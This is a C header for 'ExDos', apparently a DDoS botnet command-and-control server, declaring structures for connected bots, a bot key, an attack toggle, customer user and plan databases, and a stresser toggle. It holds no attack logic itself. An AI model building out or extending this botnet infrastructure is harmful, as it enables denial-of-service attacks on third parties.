#pragma once

//
//      == [ ExDos | Version 1.0.0 ] ==
//

#include "db/users.h"
#include "db/plans.h"
#include "user_cnc.h"
#include "bot_handler.h"
#include "config.h"
#include "cogs.h"

#include <clib/String/str.h>
#include <clib/Array/arr.h>
#include <clib/Array/multi_type.h>
#include <clib/OS/cFile.h>
#include <clib/Map/map.h>
#include <clib/Net/socket.h>

typedef struct ExDos {
    str         *IP;
    str         *Port;
    Theme       *Theme;

    // CNC Information
    Cogs        *cogs;
    Socket      *CNC;
    void        **online_users;
    long        online_user_count;

    // Bot Information
    Socket      *BotServer;
    str         *BotKey;
    uArray      *online_bots;
    int         AttackToggle;

    /* Users DB */
    User        **DB;
    long        user_idx;

    /* Plans DB */
    Plan        **Plans;

    /* Logs */
    Arr         *Logs;
    long        LogCount;
} ExDos;

ExDos *start_up_exDos(str *ip, str *port, str *theme, str *bot_port, str *bot_key, Cogs *cogs);
void ListenForUsers(void *arg);
void ListenForBots(void *arg);

User **RetrieveUserDb(ExDos *c);

void RetrieveLogs(ExDos *c);

User *FindUser(ExDos *Dos, const str *uname);

void DebugUsers(ExDos *Dos);
void DebugOnlineUsers(ExDos *Dos);

void toggle_stresser(ExDos *Dos);

long CountUsers(ExDos *Dos);
long CountOnlineUser(ExDos *Dos);
long CountBots(ExDos *Dos);
